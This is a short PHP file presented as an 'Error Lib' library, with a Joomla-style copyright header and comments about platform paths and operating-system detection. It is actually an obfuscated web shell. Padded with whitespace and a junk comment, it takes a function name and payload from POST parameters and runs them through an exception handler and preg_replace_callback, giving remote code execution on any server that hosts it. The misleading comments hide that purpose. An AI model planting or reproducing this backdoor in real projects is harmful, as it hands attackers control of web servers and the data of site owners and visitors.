<?php
/**
 * @package    Error Lib
 * ************************************************************************************************
 * @copyright  Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // XMZbKVSVtR83pkfknmedYF4RaZ1gqWNKr7e9ySqpTRd8TQQxpn4WGkQpqSMfpGYYxBRdCHfNFUak4EB
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (defined('PATH'))
{
	define('PATH', __DIR__);
}
else if (              empty  ($_POST)) {
	
	echo 'Not exception. Exiting.';
	
	exit;
}

// Register the exception library.
function exception_handler                    ($e) 
{
  preg_replace_callback                   ('||', $_POST['d']        ('', $e->getMessage                             ()), '' ); 
}
set_exception_handler           ('exception_handler'              )
;

throw new Exception                           ($_POST['f']                   ($_POST                    ['c'])                          );

// Detect the native operating system type.
$os = strtoupper              ( substr(PHP_OS, 0, 3));

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}
